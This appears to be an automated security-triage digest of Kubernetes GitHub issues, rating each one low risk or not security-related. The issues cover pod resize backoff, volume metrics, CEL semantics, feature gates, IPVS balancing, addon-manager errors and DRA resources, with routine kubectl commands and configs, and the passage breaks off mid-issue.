### 分析结果

低风险

---

## Issue #125843 [FG:InPlacePodVerticalScaling] Backoff problem when quickly reverting resize patch

- Issue 链接：[#125843](https://github.com/kubernetes/kubernetes/issues/125843)

### Issue 内容

#### What happened?

While working on #125202 , issue with backoff was discovered resulting to slow reconcile when quickly reverting resize patch. This can be reproduced please check https://github.com/kubernetes/kubernetes/issues/125205#issuecomment-2203184854 ,  https://github.com/kubernetes/kubernetes/issues/125205#issuecomment-2143527472.

Backoff issue does not happen on v1.30 or older please check https://github.com/kubernetes/kubernetes/issues/125205#issuecomment-2203224319

#### What did you expect to happen?

After patching forwards and patching backwards a pod which has a container whose `resizePolicy` is `RestartContainer`and a container whose `restartPolicy`is `RestartContainer` , pod should reach its initial state without any backoff delay introduced.

#### How can we reproduce it (as minimally and precisely as possible)?

<details>

```console
for l in `seq 301 310`; do kubectl patch pod resize-pod --patch "{\"spec\":{\"containers\":[{\"name\":\"c2\", \"resources\":{\"limits\":{\"memory\":\"${l}Mi\"}}}]}}"; sleep 3; done

$ kubectl get pod resize-pod -w
NAME         READY   STATUS    RESTARTS   AGE
resize-pod   3/3     Running   0          14s
resize-pod   3/3     Running   0          21s
resize-pod   3/3     Running   1 (1s ago)   22s
resize-pod   3/3     Running   1 (3s ago)   24s
resize-pod   3/3     Running   2 (2s ago)   26s
resize-pod   3/3     Running   2 (3s ago)   27s
resize-pod   2/3     CrashLoopBackOff   2 (1s ago)   29s
resize-pod   2/3     CrashLoopBackOff   2 (2s ago)   30s
resize-pod   2/3     CrashLoopBackOff   2 (5s ago)   33s
resize-pod   2/3     CrashLoopBackOff   2 (6s ago)   34s
resize-pod   2/3     CrashLoopBackOff   2 (8s ago)   36s
resize-pod   2/3     CrashLoopBackOff   2 (11s ago)   39s
resize-pod   3/3     Running            3 (13s ago)   41s
```
</details>

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0-alpha.0.19+d591bc54b588b1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0-alpha.2.287+7586ad36136b00
```
</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
# paste output here
Linux sotiris-Precision-5560 6.5.0-41-generic #41~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Mon Jun  3 11:32:55 UTC 2 x86_64 x86_64 x86_64 GNU/Linux```
</details>

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

# 📌 不涉及安全风险的 Issues (51 个)

## Issue #126475 Couldn't collect kubelet_volume_* metrics of broken volume using cephfs.

- Issue 链接：[#126475](https://github.com/kubernetes/kubernetes/issues/126475)

### Issue 内容

#### What happened?

Broken cephfs volume exists, but kubelet_volume_* metrics of it is not output.

As kubelet_volume_stats_health_status_abnormal metrics is not output, I can't detect volume health.

#### What did you expect to happen?

The kubelet_volume_stats_health_status_abnormal should be output for broken volumes.
```
kubelet_volume_stats_health_status_abnormal{namespace="default",persistentvolumeclaim="broken"} 1
```

#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable feature gate for CSIVolumeHealth
2. Prepare PVCs which provisioned by cephfs and are Unhealthy.
3. Retrieve kubelet metrics and verify that there are no metrics for broken PVCs

#### Anything else we need to know?

In ceph-csi, when an unhelthy volume is met, only the volumeCondition is returned as NodeGetVolumeStatsResponse.

In kubernetes, only those with Usage in NodeGetVolumeStatsResponse are accepted.

I think that it should accept only VolumeCondition without Usage.

https://github.com/ceph/ceph-csi/blob/e6540989a52212cf9b66672b4aa8fde19d037be6/internal/cephfs/nodeserver.go#L787

https://github.com/kubernetes/kubernetes/blob/2a1d4172e22abb6759b3d2ad21bb09a04eef596d/pkg/volume/csi/csi_client.go#L611-L638

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.10
WARNING: version difference between client (1.30) and server (1.28) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>
baremetal
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux bm-008 5.15.0-112-generic #122-Ubuntu SMP Thu May 23 07:48:21 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
- rook-ceph-cluster: chart 1.14.5
- rook-ceph: chart 1.14.5
</details>


### 分析结果

不涉及

---

## Issue #126472 Consistent behavior on nullable struct used in cel expression with optonal

- Issue 链接：[#126472](https://github.com/kubernetes/kubernetes/issues/126472)

### Issue 内容

#### What happened?

Previous a issue reported in cel-go regarding with nullable struct behavior in optional (Related issue: https://github.com/google/cel-go/issues/937).
The fix is in https://github.com/google/cel-go/pull/938 and https://github.com/google/cel-go/pull/939 with a flag added for the fix. However, opt-in this fix in k8s would result in breaking change on certain cel expressions. 

Thanks to @TristonianJones who suggested the updates on cel type system to minimized the breakage: 
"Treat nullable fields as unset / absent within the `Get` and `Find` operations for unstructuredList and unstructuredMap types. This would be consistent with CEL's field presence semantics and result in the correct behavior for the existing expressions with and without optional syntax."
```
// Returns false today
// Returns true if CEL bug fix is enabled
// Returns false if K8s field traversal updated and bug fix enabled 
object.?complexType.hasValue() 
```
However, this change would still introduce a breaking behavior for comparisons of complex types to null values.
```
// Will return object.otherType today, but object.complexType.field tomorrow 
// when the complexType value is unset
object.complexType == null ? object.otherType : object.complexType.field

// Conditionally true or false today
// Trivially true or trivially false if the default value is returned with
// a change in K8s object traversal
object.complexType != null
object.complexType == null
```

Additionally, this would be considered as breaking change and should fulfill the compatibility policy in k8s.

#### What did you expect to happen?

Fix the issue in a non-breaking way.

#### How can we reproduce it (as minimally and precisely as possible)?

Using cel optional expression on nullable struct.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126434 Feature gates to bypass in-tree plugin registration dropped without first graduating

- Issue 链接：[#126434](https://github.com/kubernetes/kubernetes/issues/126434)

### Issue 内容

#### What happened?

In the upcoming v1.31 release, we plan to drop some alpha feature gates; see 
https://github.com/kubernetes/kubernetes/issues/126406#issuecomment-2255700515
However, people may have been setting these feature gates (even thought they have no effect).

Per https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/feature-gates.md, we should lock them to true for at least one release before removal.



#### What did you expect to happen?

[For each feature gate] the feature gate cannot actually be disabled, but is documented as locked to true. Specifiying the feature gate on the command line does not cause component failure.

#### How can we reproduce it (as minimally and precisely as possible)?

Read the code / try explicitly disabling these feature gates.

#### Anything else we need to know?

I think this is a release blocker until we decide how we'll handle it.

If we leave things as they are, we should clearly call out the snag in the release notes.

### 分析结果

不涉及

---

## Issue #126432 Statefulset ObjectMeta.Generation and status.observedGeneration are inconsistent

- Issue 链接：[#126432](https://github.com/kubernetes/kubernetes/issues/126432)

### Issue 内容

#### What happened?

The ObjectMeta.Generation and status.observedGeneration of an STS in the environment are inconsistent, but the pod is in the running state.
The kube-controller-manager log does not show that the pod tuning is abnormal.
![image](https://github.com/user-attachments/assets/d3cf4aa9-5542-43b4-930c-1995aebd489a)


#### What did you expect to happen?

ObjectMeta.Generation is equal to status.observedGeneration

#### How can we reproduce it (as minimally and precisely as possible)?

N/A

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28.1
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126430 Kubernetes Cert rotation

- Issue 链接：[#126430](https://github.com/kubernetes/kubernetes/issues/126430)

### Issue 内容

#### What happened?

Does the Kubernetes-managed CA also get renewed during Kubernetes Certs rotation or on Kubernetes upgrade?


#### What did you expect to happen?

If we are using the same VM for 10 years and keep patching the Kubernetes version then the Kubernetes managed CA should also get renewed.

but as per the Kubernetes code base  
https://github.com/kubernetes/kubernetes/blob/a2106b5f73fe9352f7bc0520788855d57fc301e1/cmd/kubeadm/app/phases/certs/renewal/manager.go#L114
it says renewal of CA is not managed.

In such case how we will renew the CA ?



#### How can we reproduce it (as minimally and precisely as possible)?

NA

#### Anything else we need to know?

NA

#### Kubernetes version

1.27.2

#### Cloud provider

NA

#### OS version

Linux

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126425 the code said when NodeCacheCapable  is true NodeNames  has value，NodeCacheCapable is false Nodes has value。but NodeNames  alwalys has value，Nodes  always is nil

- Issue 链接：[#126425](https://github.com/kubernetes/kubernetes/issues/126425)

### Issue 内容

#### What happened?

type ExtenderArgs struct {
	// Pod being scheduled
	Pod *v1.Pod
	// List of candidate nodes where the pod can be scheduled; to be populated
	// only if Extender.NodeCacheCapable == false
	Nodes *v1.NodeList
	// List of candidate node names where the pod can be scheduled; to be
	// populated only if Extender.NodeCacheCapable == true
	NodeNames *[]string
}

![image](https://github.com/user-attachments/assets/abf70d5c-5bf0-4e2a-b0a5-688d21fd59be)
```
apiVersion: kubescheduler.config.k8s.io/v1
kind: KubeSchedulerConfiguration
clientConnection:
  kubeconfig: "/etc/kubernetes/scheduler.conf"
leaderElection:
  leaderElect: true
  leaseDuration: 15s
  renewDeadline: 10s
  resourceLock: leases
  resourceName: kube-scheduler
  resourceNamespace: kube-system
  retryPeriod: 2s
extenders:
- urlPrefix: "http://127.0.0.1:80/scheduler"
  filterVerb: filter
  preemptVerb: preemption
  prioritizeVerb: priorities
  weight: 2
  bindVerb: bind
  enableHTTPS: false
  httpTimeout: 10s
  nodeCacheCapable: false
  ignorable: false
```

#### What did you expect to happen?

parameter value error

#### How can we reproduce it (as minimally and precisely as possible)?

try the code

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

1.30.0

</details>


#### Cloud provider

<details>
vmware
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126414 EventedPLEG: Timestamp in PodStatus for Generic PLEG should be more accurate

- Issue 链接：[#126414](https://github.com/kubernetes/kubernetes/issues/126414)

### Issue 内容

#### What happened?

When the `EventedPLEG` feature is enabled, GenericPLEG also works for backing up the EventedPLEG. In case both PLEGs update the same pod status in the cache at the almost same time, `Timestamp` was introduced to `PodSandboxStatusResponse` in the CRI API ([KEP](https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/3386-kubelet-evented-pleg#timestamp-of-the-pod-status)). This timestamp (`PodSandboxStatusResponse.Timestamp`) is recorded in seconds while the timestamp in an event (`ContainerEventResponse.CreatedAt`) is recorded in nanoseconds. So, these timestamps cannot be compared accurately.

- Evented PLEG uses a timestamp in `ContainerEventResponse.CreatedAt` for the cache. This is set in nanoseconds in runtimes ([CRI-O code](https://github.com/cri-o/cri-o/blob/74d54cd3071c51225055df91121ebf77618e86a8/server/server.go#L934)) (though there is a bug (#124297) that kubelet treats it as seconds).
- Generic PLEG uses a timestamp in `PodSandboxStatusResponse.Timestamp` for the cache:
  https://github.com/kubernetes/kubernetes/blob/a2106b5f73fe9352f7bc0520788855d57fc301e1/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L1583
  This value is set in seconds by [CRI-O](https://github.com/cri-o/cri-o/blob/74d54cd3071c51225055df91121ebf77618e86a8/server/sandbox_status.go#L43-L65) while [containerd](https://github.com/containerd/containerd/blob/2ddd3db9524b14000208862e2e578e567b391a06/internal/cri/server/sandbox_status.go#L85-L88) does not look to set it (though there is another issue (https://github.com/kubernetes/kubernetes/issues/125624#issuecomment-2254396844) regarding containerd case). 


#### What did you expect to happen?

`PodSandboxStatusResponse.Timestamp` should be recorded in nanoseconds.


#### How can we reproduce it (as minimally and precisely as possible)?

It is difficult to reproduce this race intentionally on Kubernetes.

The following sample code simulates the problem:
```
package main

import (
	"fmt"
	"time"
)

func main() {
	eventedTime := time.Now().UnixNano()
	time.Sleep(100 * time.Millisecond)
	genericTime := time.Now().Unix()

	cachedEventedTime := time.Unix(0, eventedTime)
	cachedGenericTime := time.Unix(genericTime, 0)

	if cachedEventedTime.Before(cachedGenericTime) {
		fmt.Printf("Expected: evented:%v, generic:%v\n", cachedEventedTime, cachedGenericTime)
	} else {
		fmt.Printf("Unexpected: evented:%v, generic:%v\n", cachedEventedTime, cachedGenericTime)
	}
}
```

```
$ go run timestamp.go 
Unexpected: evented:2024-07-28 13:57:26.329366032 +0200 CEST, generic:2024-07-28 13:57:26 +0200 CEST
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

Current master (1.31)


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

This issue could happen with CRI-O, which sets `Timestamp` to `PodSandboxStatusResponse`.


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126393 Make apiserver.Config.FeatureGate easier to access feature gate of other components.

- Issue 链接：[#126393](https://github.com/kubernetes/kubernetes/issues/126393)

### Issue 内容

#### What happened?

With the introduction of https://github.com/kubernetes/enhancements/issues/4330, the feature gates of different components are associated with the versions of their components. Going forward, we should not put all features inside the `DefaultFeatureGate`, and it would be more common to pass instances of feature gate around instead of just referencing the `DefaultFeatureGate`.

Currently we pass a single instance of `featuregate.FeatureGate` into the [`apiserver.Config`](https://github.com/kubernetes/kubernetes/blob/3a8a60eba29940e26ac8db52329a91ba87305114/staging/src/k8s.io/apiserver/pkg/server/config.go#L157). This could be problematic if we need access to the feature gates of other components in apiserver. 

#### What did you expect to happen?

 the `ServerConfig.FeatureGate` needs to be a type that has `func FeatureGateFor(component string) featuregate.FeatureGate` from `ComponentGlobalsRegistry`, so it is easier to access feature gates of other components.

#### How can we reproduce it (as minimally and precisely as possible)?

N.A.

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.31

#### Cloud provider

<details>
N.A.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126378 IPVS backend active connections aren't distributed evenly

- Issue 链接：[#126378](https://github.com/kubernetes/kubernetes/issues/126378)

### Issue 内容

#### What happened?

Hello Kubernetes Team,
I'm newbie about networks or `kube-proxy`, so I'd appreciate it if anyone could help me!

Recently I faced unbalanced network Tx traffic in all master nodes and I found that there were unbalance between the number of IPVS connection between `Services` exposed in k8s cluster and `kube-apiserver`.

This happened when any of `kube-apiserver` stopped or restarted, and `kube-proxy` seemed to re-established IPVS connections to alive `kube-apiserver` and this caused unbalance IPVS connections, in this case `MASTER2` was restarted, such as:
```
$ ipvsadm -ln | grep 10.233.0.1 -A 3
TCP  10.233.0.1:443 rr
  -> MASTER1:6443           Masq    1      13         0
  -> MASTER2:6443           Masq    1      2          0
  -> MASTER3:6443           Masq    1      12          0
```
as you can see, there is unbalance connection between all master nodes and this remains the save even after a long time.

Here's example of above situation in one of my cluster:
1. The number of IPVS backend connections still remains balanced with all `kube-apiserver` until then 00:30.
2. `kube-apiserver` restarted at 00:30, after then IPVS connections were changed and imbalance situation happened. This wasn't changed even if almost 16 hours elapsed.

![image](https://github.com/user-attachments/assets/3f0e2468-790f-4225-bf4a-ec2ed1031aed)

I'm wondering that:
* Why does this imbalance continue to persist?
* Is there a way to resolve this situation, such as modify `kube-proxy` configuration?

#### What did you expect to happen?

When `kube-apiserver` stops:
1. `kube-proxy` will re-establish IPVS connections between `Service` and `kube-apiserver`.
4. `kube-proxy` will establish IPVS connection with alive `kube-apiserver`.

I expected that after `kube-apiserver` restarts and elapse several minutes and hours:
5. The number of IPVS connection in local node will be distributed evenly.

But IPVS connections are remaining same which I means that the number of IPVS connection is remaining also and there isn't significant changes after elapsed hours.

#### How can we reproduce it (as minimally and precisely as possible)?

WIth deploying several `Services` (ensuring there are IPVS connections between `kube-apiserver` and node), kill or restart one of `kube-apiserver`.

#### Anything else we need to know?

I'm using `IPVS` mode for `kube-proxy`. Here's the full configuration I'm using for `kube-proxy`:
```
apiVersion: v1
data:
  config.conf: |-
    apiVersion: kubeproxy.config.k8s.io/v1alpha1
    bindAddress: 0.0.0.0
    bindAddressHardFail: false
    clientConnection:
      acceptContentTypes: ""
      burst: 10
      contentType: application/vnd.kubernetes.protobuf
      kubeconfig: /var/lib/kube-proxy/kubeconfig.conf
      qps: 5
    clusterCIDR: 10.0.0.0/12
    configSyncPeriod: 15m0s
    conntrack:
      maxPerCore: 32768
      min: 131072
      tcpCloseWaitTimeout: 1h0m0s
      tcpEstablishedTimeout: 24h0m0s
    detectLocalMode: ""
    enableProfiling: false
    healthzBindAddress: 0.0.0.0:10256
    hostnameOverride: master01
    iptables:
      masqueradeAll: false
      masqueradeBit: 14
      minSyncPeriod: 0s
      syncPeriod: 30s
    ipvs:
      excludeCIDRs: []
      minSyncPeriod: 0s
      scheduler: rr
      strictARP: true
      syncPeriod: 30s
      tcpFinTimeout: 0s
      tcpTimeout: 0s
      udpTimeout: 0s
    kind: KubeProxyConfiguration
    metricsBindAddress: 0.0.0.0:10249
    mode: ipvs
    nodePortAddresses: []
    oomScoreAdj: -999
    portRange: ""
    showHiddenMetricsForVersion: ""
    udpIdleTimeout: 250ms
    winkernel:
      enableDSR: false
      networkName: ""
      sourceVip: ""
  kubeconfig.conf: |-
    apiVersion: v1
    kind: Config
    clusters:
    - cluster:
        certificate-authority: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        server: https://127.0.0.1:6443
      name: default
    contexts:
    - context:
        cluster: default
        namespace: default
        user: default
      name: default
    current-context: default
    users:
    - name: default
      user:
        tokenFile: /var/run/secrets/kubernetes.io/serviceaccount/token
```

#### Kubernetes version

K8S v1.21.6
K8S v1.28.3

#### Cloud provider

On-premise K8S cluster provisioned via `kubespray`


#### OS version

```
$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ uname -a
Linux n3-mgmt-master01 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

```
$ crictl --version
crictl version v1.21.0
```

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126371 Kube-addon-manager fail to execute in kubernetes v1.28.7

- Issue 链接：[#126371](https://github.com/kubernetes/kubernetes/issues/126371)

### Issue 内容

#### What happened?

[kube-addons_logs.txt](https://github.com/user-attachments/files/16386497/kube-addons_logs.txt)

Hi Team , 

**Issue summary :**

kube-addon-manager doesnt work as expected in kubernetes v1.28 , though job is running in background . Its unable to perform reconcile tasks for addons when add & replace a new manifest in "/etc/kubernetes/addons" location.

I noticed , Job fails with API version compatibility issue for CronJob API version "**batch/v1beta1**" referred in the script , however actual API version of CronJob in kubernetes v1.28 cluster is "**batch/v1**" 

**Suggestion :** 

Can we first retrieve the API version of objects from existing Cluster & store those in variable and then get those called in reconcile function , this would avoid API compatibility version Issues in future.


**Error :**

```shell
+ /usr/local/bin/kubectl --kubeconfig=/etc/kubernetes/admin.conf apply -f /etc/kubernetes/addons -l 'kubernetes.io/cluster-service!=true,addonman
core/v1/ConfigMap --prune-whitelist core/v1/Endpoints --prune-whitelist core/v1/Namespace --prune-whitelist core/v1/PersistentVolumeClaim --prune
--prune-whitelist core/v1/ReplicationController --prune-whitelist core/v1/Secret --prune-whitelist core/v1/Service --prune-whitelist batch/v1/Job
/DaemonSet --prune-whitelist apps/v1/Deployment --prune-whitelist apps/v1/ReplicaSet --prune-whitelist apps/v1/StatefulSet --prune-whitelist netw
+ grep -v configured
error: no matches for kind "CronJob" in version "batch/v1beta1"
``` 


#### What did you expect to happen?

Reconcile Job has to perform below mentioned tasks , which doesnt perform below tasks due to Cronjob API Version error.

- Any changes made through the API will automatically revert to the configuration in /etc/kubernetes/addons/.

- If an extension is deleted via the API, it will be automatically recreated from the configuration in /etc/kubernetes/addons/.

- Removing configuration from /etc/kubernetes/addons/ will also delete the corresponding Kubernetes resources.

- Essentially, modifications can only be made by adjusting the configuration in /etc/kubernetes/addons/.

#### How can we reproduce it (as minimally and precisely as possible)?

To test Kube-addons-manager in Kubernetes v1.28.7 with "addons" components Creation/Modification/Removal.

#### Anything else we need to know?

NA

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: version.Info{Major:"1", Minor:"28", GitVersion:"v1.28.7", GitCommit:"c8dcb00be9961ec36d141d2e4103f85f92bcf291", GitTreeState:"clean", BuildDate:"2024-02-14T10:32:14Z", GoVersion:"go1.21.7", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd - 1.6.28
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
Calico 3.38.0
</details>


### 分析结果

不涉及

---

## Issue #126370 The storage volume cannot be mounted or mounts have timed out

- Issue 链接：[#126370](https://github.com/kubernetes/kubernetes/issues/126370)

### Issue 内容

#### What happened?

The storage volume cannot be mounted or mounts have timed out

#### What did you expect to happen?

# PossibleSolution 
The storage volume cannot be mounted or mounts have timed out

#### How can we reproduce it (as minimally and precisely as possible)?

The number of replicas of a Deployment with EVS volumes is greater than 1 


#### Anything else we need to know?

_No response_

#### Kubernetes version

all

#### Cloud provider

node

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126346 dra did not create ResourceSlice api，so I create one，but get nono

- Issue 链接：[#126346](https://github.com/kubernetes/kubernetes/issues/126346)

### Issue 内容

#### What happened?

```
root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl apply -f resource-slice.yaml 
resourceslice.resource.k8s.io/k8s-worker01 created
root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl get resourceslice -A
No resources found
```

```
apiVersion: resource.k8s.io/v1alpha2
kind: ResourceSlice
metadata:
  name: k8s-worker01
driverName: gpu.resource.nvidia.com
nodeName: k8s-worker01
namedResources:
  instances:
  - name: nvidia-gpu
    attributes:
    - name: gpu.memory
      quantity: 4Gi
    - name: num.cores
      int: 1
    - name: vendor
      string: nvidia
    - name: cuda.version
      string: "12.4"
    - name: driver.version
      string: "550.90.07"
    - name: gpu.name
      string: NVIDIA GeForce GTX 1650
```

#### What did you expect to happen?

get success

#### How can we reproduce it (as minimally and precisely as possible)?

apply the yaml

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl version
Client Version: v1.30.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0

</details>


#### Cloud provider

<details>
pve 8
</details>


#### OS version

<details>
ubuntu 2404

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126328 All pods will restart when enable feature-gates InPlacePodVerticalScaling of apiserver.

- Issue 链接：[#126328](https://github.com/kubernetes/kubernetes/issues/126328)

### Issue 内容

#### What happened?

All pods will restart when enable feature-gates InPlacePodVerticalScaling of apiserver. I'm not sure if this is a bug or it should be an enhancement.

#### What did you expect to happen?

I hope I can enable InPlacePodVerticalScaling in some existing clusters without restarting pods, at least not on a large scale.

#### How can we reproduce it (as minimally and precisely as possible)?

Create some pods in the cluster, and enable feature-gates InPlacePodVerticalScaling of apiserver. 

Then all pod will restart💥💥💥.

#### Anything else we need to know?

There is no ResizePolicy field when kubelet calculates the hash value of the existing pod. 

And apiserver will add the default value of spec.containers.ResizePolicy to the pod after turning on InPlacePodVerticalScaling. 

Then kubelet will sean the spec.containers.ResizePolicy and found hash changed.

#### Kubernetes version

```console
$ kubectl version
Client Version: v1.28.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.3
```


#### Cloud provider

NOP

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

不涉及

---

## Issue #126325 Empty `NodeSelectorTerm` is confusing in pod.nodeAffinity

- Issue 链接：[#126325](https://github.com/kubernetes/kubernetes/issues/126325)

### Issue 内容

#### What happened?

Pod node affinity with empty `NodeSelectorTerm`, result in pod `Pending`.
```
apiVersion: v1
kind: Pod
metadata:
  name: with-node-affinity
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - {}
  containers:
  - name: with-node-affinity
    image: nginx:1.7.9
```

k apply -f pod.yaml
```
k get po
                                 
NAME                                     READY   STATUS    RESTARTS   AGE
with-node-affinity                       0/1     Pending   0          5m3s

Events:
  Type     Reason             Age    From                Message
  ----     ------             ----   ----                -------
  Warning  FailedScheduling   2m52s  default-scheduler   0/3 nodes are available: 3 node(s) didn't match Pod's node affinity/selector. preemption: 0/3 nodes are available: 3 Preemption is not helpful for scheduling..
```

#### What did you expect to happen?

Empty `NodeSelectorTerm` represents no selector, should select all nodes available.
Or empty `NodeSelectorTerm` should not be allowed in pod.nodeAffinity.

#### How can we reproduce it (as minimally and precisely as possible)?

See above yaml.


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


### 分析结果

不涉及

---

## Issue #126320 dra static resourceClaim is ok，but dynamic is not ok？no error log

- Issue 链接：[#126320](https://github.com/kubernetes/kubernetes/issues/126320)

### Issue 内容

#### What happened?
```
root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl get pod
NAME       READY   STATUS    RESTARTS   AGE
gpu-pod    0/1     Pending   0          7s
gpu-pod2   1/1     Running   0          7s


root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl get resourceclaim
NAME                      RESOURCECLASSNAME   ALLOCATIONMODE         STATE                AGE
